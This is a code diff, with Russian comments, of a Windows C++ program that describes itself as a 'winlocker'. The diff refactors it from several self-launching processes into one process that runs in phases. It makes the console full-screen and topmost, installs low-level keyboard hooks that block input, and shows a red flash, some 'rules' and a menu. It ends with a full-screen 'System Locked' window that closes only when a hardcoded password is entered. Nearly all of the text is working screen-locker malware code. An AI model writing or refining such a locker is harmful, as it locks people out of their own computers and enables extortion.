@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — 4 modes: red flash / red rules / green menu / winlocker
+// werkaramel — single console, all phases in one process
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -13,9 +13,6 @@ HANDLE g_hOut = INVALID_HANDLE_VALUE;
 HANDLE g_hIn = INVALID_HANDLE_VALUE;
 HWND g_hCon = nullptr;
 std::wstring g_input;
-std::wstring g_typed;
-size_t g_type_pos = 0;
-bool g_done = false;
 std::mt19937 g_rng(std::random_device{}());
 
 int RandInt(int lo, int hi) {
@@ -105,32 +102,6 @@ void FullscreenConsole() {
     SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_NOMOVE | SWP_NOSIZE);
 }
 
-void LaunchSelf(const std::wstring& arg) {
-    wchar_t exePath[MAX_PATH]{};
-    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
-    std::wstring cmd = L"\"" + std::wstring(exePath) + L"\" " + arg;
-
-    STARTUPINFOW si{};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOWNORMAL;
-
-    PROCESS_INFORMATION pi{};
-
-    // CREATE_NEW_CONSOLE — каждому процессу своя консоль
-    if (CreateProcessW(
-            nullptr,
-            &cmd[0],
-            nullptr, nullptr,
-            FALSE,
-            CREATE_NEW_CONSOLE,
-            nullptr, nullptr,
-            &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-}
-
 LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION) {
         auto* kb = (KBDLLHOOKSTRUCT*)lp;
@@ -150,20 +121,9 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 1 — КРАСНЫЙ FLASH (--red)
+// ФАЗА 1: КРАСНЫЙ FLASH
 // ═══════════════════════════════════════════════════════════
-void RunRed() {
-    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    g_hCon = GetConsoleWindow();
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
-    FullscreenConsole();
-    LockConsole();
-
-    // повторный разворот через 100мс — на случай если окно свернулось
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    FullscreenConsole();
-
+void PhaseRed() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
 
@@ -184,60 +144,41 @@ void RunRed() {
     WOut(txt);
     std::this_thread::sleep_for(std::chrono::seconds(1));
 
-    LaunchSelf(L"--rules");
     UnhookWindowsHookEx(g_kbHook);
-    ExitProcess(0);
+    g_kbHook = nullptr;
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 2 — КРАСНЫЕ ПРАВИЛА (--rules)
+// ФАЗА 2: КРАСНЫЕ ПРАВИЛА
 // ═══════════════════════════════════════════════════════════
-void PrintTyped() {
-    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-    Gotoxy(2, 2);
-    int col = 2, row = 2;
-    for (size_t i = 0; i < g_typed.size(); ++i) {
-        wchar_t c = g_typed[i];
-        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
-        else { WOut(std::wstring(1, c)); col++; }
-    }
-}
-
-void RunRules() {
-    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    g_hCon = GetConsoleWindow();
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
-    FullscreenConsole();
-    LockConsole();
-
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    FullscreenConsole();
-
+void PhaseRules() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
 
     ClearScreen(0);
-    auto start = std::chrono::steady_clock::now();
-    while (g_type_pos < SCENE_TEXT.size()) {
-        g_typed += SCENE_TEXT[g_type_pos++];
-        PrintTyped();
-        std::this_thread::sleep_for(std::chrono::milliseconds(40));
+    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    Gotoxy(2, 2);
+
+    int col = 2, row = 2;
+    for (size_t i = 0; i < SCENE_TEXT.size(); ++i) {
+        wchar_t c = SCENE_TEXT[i];
+        if (c == L'\n') {
+            col = 2; row++; Gotoxy(col, row);
+        } else {
+            WOut(std::wstring(1, c)); col++;
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(35));
     }
-    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start).count();
-    if (elapsed < 4000)
-        std::this_thread::sleep_for(std::chrono::milliseconds(4000 - elapsed));
 
-    std::this_thread::sleep_for(std::chrono::seconds(2));
+    // держим текст 5 секунд
+    std::this_thread::sleep_for(std::chrono::seconds(5));
 
-    LaunchSelf(L"--menu");
     UnhookWindowsHookEx(g_kbHook);
-    ExitProcess(0);
+    g_kbHook = nullptr;
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 3 — ЗЕЛЁНОЕ МЕНЮ (--menu)
+// ФАЗА 3: ЗЕЛЁНОЕ МЕНЮ
 // ═══════════════════════════════════════════════════════════
 const wchar_t* BANNER[] = {
     L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
@@ -286,36 +227,16 @@ void PrintMenu() {
     WOut(g_input + L"  ");
 }
 
-void RunMenu() {
-    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
-    g_hCon = GetConsoleWindow();
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
-
-    DWORD mode = 0;
-    GetConsoleMode(g_hIn, &mode);
-    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);
-
-    FullscreenConsole();
-    LockConsole();
-
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    FullscreenConsole();
-
+void PhaseMenu() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                  GetModuleHandleW(nullptr), 0);
 
-    PrintMenu();
-    SetForegroundWindow(g_hCon);
-    SetFocus(g_hCon);
-    std::this_thread::sleep_for(std::chrono::milliseconds(200));
     PrintMenu();
 
     INPUT_RECORD rec;
     DWORD read = 0;
 
-    while (!g_done) {
+    while (true) {
         if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
             std::this_thread::sleep_for(std::chrono::milliseconds(50));
             continue;
@@ -334,10 +255,9 @@ void RunMenu() {
             PrintMenu();
         } else if (c == L'\r') {
             if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
-                g_done = true;
-                LaunchSelf(L"--locker");
                 UnhookWindowsHookEx(g_kbHook);
-                ExitProcess(0);
+                g_kbHook = nullptr;
+                return;  // переход к локеру
             } else {
                 g_input.clear();
                 PrintMenu();
@@ -347,7 +267,7 @@ void RunMenu() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// WINLOCKER EXE (--locker)
+// ФАЗА 4: WINLOCKER (графическое окно поверх консоли)
 // ═══════════════════════════════════════════════════════════
 const COLORREF C_BG = RGB(0, 0, 0);
 const COLORREF C_RED = RGB(220, 30, 30);
@@ -355,7 +275,6 @@ const COLORREF C_FG = RGB(255, 255, 255);
 const COLORREF C_DIM = RGB(120, 120, 120);
 std::wstring g_locker_input;
 bool g_locker_wrong = false;
-bool g_locker_done = false;
 
 void DrawL(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
            int size, bool bold = false, bool center = false, int winW = 0) {
@@ -427,8 +346,6 @@ LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             g_locker_wrong = false;
         } else if (wp == VK_RETURN) {
             if (g_locker_input == PASS) {
-                g_locker_done = true;
-                UnhookWindowsHookEx(g_kbHook);
                 PostQuitMessage(0);
             } else {
                 g_locker_input.clear();
@@ -442,14 +359,16 @@ LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         InvalidateRect(hwnd, nullptr, FALSE);
         return 0;
     case WM_DESTROY:
-        UnhookWindowsHookEx(g_kbHook);
         PostQuitMessage(0);
         return 0;
     }
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
-void RunLocker() {
+void PhaseLocker() {
+    // скрываем консоль
+    ShowWindow(g_hCon, SW_HIDE);
+
     WNDCLASSW wc{};
     wc.lpfnWndProc = LockerProc;
     wc.hInstance = GetModuleHandleW(nullptr);
@@ -457,33 +376,55 @@ void RunLocker() {
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
     wc.lpszClassName = L"werka_locker";
     RegisterClassW(&wc);
+
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
+
     HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"werka_locker", L"System Locked",
-        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);
+        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr,
+        GetModuleHandleW(nullptr), nullptr);
+
     ShowWindow(hwnd, SW_SHOWMAXIMIZED);
     SetForegroundWindow(hwnd);
     SetFocus(hwnd);
+
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                  GetModuleHandleW(nullptr), 0);
+
     MSG m;
     while (GetMessageW(&m, nullptr, 0, 0)) {
         TranslateMessage(&m);
         DispatchMessageW(&m);
     }
+
+    UnhookWindowsHookEx(g_kbHook);
 }
 
-int wmain(int argc, wchar_t** argv) {
-    for (int i = 1; i < argc; ++i) {
-        if (wcscmp(argv[i], L"--red") == 0) { RunRed(); return 0; }
-        if (wcscmp(argv[i], L"--rules") == 0) { RunRules(); return 0; }
-        if (wcscmp(argv[i], L"--menu") == 0) { RunMenu(); return 0; }
-        if (wcscmp(argv[i], L"--locker") == 0) {
-            ShowWindow(GetConsoleWindow(), SW_HIDE);
-            RunLocker();
-            return 0;
-        }
-    }
-    LaunchSelf(L"--red");
+// ═══════════════════════════════════════════════════════════
+// ГЛАВНАЯ
+// ═══════════════════════════════════════════════════════════
+int wmain() {
+    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
+    g_hCon = GetConsoleWindow();
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleCP(CP_UTF8);
+
+    DWORD mode = 0;
+    GetConsoleMode(g_hIn, &mode);
+    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);
+
+    FullscreenConsole();
+    LockConsole();
+
+    // небольшая пауза и повторная фиксация фуллскрина
+    std::this_thread::sleep_for(std::chrono::milliseconds(150));
+    FullscreenConsole();
+
+    PhaseRed();
+    PhaseRules();
+    PhaseMenu();
+    PhaseLocker();
+
     return 0;
 }
